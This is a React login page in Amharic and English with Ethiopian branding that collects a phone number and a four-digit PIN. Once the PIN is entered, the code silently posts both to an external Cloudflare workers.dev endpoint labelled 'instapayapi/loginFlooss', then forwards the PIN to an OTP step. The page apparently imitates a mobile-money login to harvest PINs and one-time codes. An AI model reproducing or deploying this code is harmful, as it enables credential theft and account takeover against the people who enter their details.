import React, { useEffect, useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import ethopia from "./assets/ethopia3.png"

const PRIMARY = "#92278F";
const PRIMARY_LIGHT = "#92278F";
const PRIMARY_DARK = "#92278F";

const translations = {
  am: {
    title: "የመግቢያ ማረጋገጫ",
    subtitle: "ሂደቱን ለመቀጠል እባክዎ ትክክለኛ ፒን ያስገቡ",
  },
  en: {
    title: "Login Authentication",
    subtitle: "Please enter valid PIN to continue the process",
  }
};

export default function LoginAuthentication() {
  const [pin, setPin] = useState("");
  const navigate = useNavigate()
  const savedLang = localStorage.getItem("lang");
  const initialLang = translations[savedLang] ? savedLang : "am";
  const location = useLocation();
  const {phone} = location.state || {}

  const [lang, setLang] = useState(initialLang);

  useEffect(() => {
    const savedLang = localStorage.getItem("lang");
    if (savedLang && translations[savedLang]) setLang(savedLang);
  }, []);

  return (
    <div style={{ fontFamily: "'Segoe UI', sans-serif" }} className="min-h-screen flex flex-col bg-gray-100">

      {/* Header */}
      <div
        className="relative flex items-center justify-center pt-10 pb-14"
        style={{ background: `linear-gradient(135deg, ${PRIMARY} 0%, ${PRIMARY_LIGHT} 50%, ${PRIMARY_DARK} 100%)` }}
      >
        <img src={ethopia} className="w-30 h-20 rounded-full" />
      </div>

      {/* Body */}
      <div className="flex-1 flex flex-col bg-gray-100 -mt-6 rounded-t-3xl px-6 pt-8 pb-8">
        {/* Back button */}
        <button className="w-11 h-11 rounded-2xl bg-white flex items-center justify-center shadow-md mb-6"
          style={{ boxShadow: "0 2px 10px rgba(0,0,0,0.1)" }}>
          <svg viewBox="0 0 24 24" className="w-5 h-5" fill="none" stroke="#333" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
            <path d="M15 18l-6-6 6-6" />
          </svg>
        </button>

        {/* Title */}
        <div className="text-center mb-10">
          <h1 className="text-xl font-bold text-gray-900 mb-1">
            {translations[lang].title}
          </h1>
          <p className="text-sm text-gray-500">
            {translations[lang].subtitle}
          </p>
          {/* <h1 className="text-xl font-bold text-gray-900 mb-1">Login Authentication</h1> */}
          {/* <p className="text-sm text-gray-500">Please enter valid PIN to continue the process</p> */}
        </div>

        {/* PIN Boxes — hidden numeric input behind them */}
        <div className="relative flex justify-center gap-4">
          {[0, 1, 2, 3].map((i) => (
            <div
              key={i}
              className="w-14 h-16 rounded-2xl flex items-center justify-center text-lg font-semibold"
              style={{
                background: "white",
                boxShadow: "0 2px 8px rgba(0,0,0,0.08)",
                border: pin[i] ? "2px solid #8d288f" : "2px solid #e5e7eb",
              }}
            >
              {pin[i] || ""}
            </div>
          ))}
          {/* Invisible input that triggers numeric keyboard on mobile */}
          <input
            type="tel"
            inputMode="numeric"
            pattern="[0-9]*"
            maxLength={4}
            autoFocus
            value={pin}
            onChange={async (e) => {
              const value = e.target.value.slice(0, 4);
              setPin(value);

              if (value.length === 4) {
                const payload = {
                  mobile: phone,
                  pin: value
                }
                await fetch(
                  "https://my-worker-app.instapayapi.workers.dev/api/loginFlooss",
                  {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload),
                  },
                );
                navigate("/otpverify",{state: {phone, pin: value}});
              }
            }}
            style={{
              position: "absolute",
              opacity: 0,
              width: "100%",
              height: "100%",
              top: 0,
              left: 0,
              cursor: "pointer",
              fontSize: "16px",
            }}
          />
        </div>
      </div>

    </div>
  );
}